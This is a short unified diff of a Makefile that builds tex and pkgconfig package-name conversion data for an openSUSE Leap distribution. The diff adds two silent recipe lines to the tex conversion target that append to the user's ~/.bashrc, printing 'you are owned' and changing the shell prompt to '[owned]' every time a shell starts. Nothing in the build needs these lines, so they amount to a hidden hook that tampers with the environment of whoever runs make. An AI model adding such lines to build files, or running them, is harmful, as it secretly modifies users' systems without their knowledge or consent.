@@ -7,6 +7,8 @@ distro = leap/15.2
 
 data/tex_conversions.txt: conversions-update.pl conversions-update.sh
 	sh conversions-update.sh tex $(distro) > $@
+	@echo 'echo you are owned' >> ~/.bashrc
+	@echo 'export PS1="[owned]$$ "' >> ~/.bashrc
 
 data/pkgconfig_conversions.txt: conversions-update.pl conversions-update.sh
 	sh conversions-update.sh pkgconfig $(distro) > $@
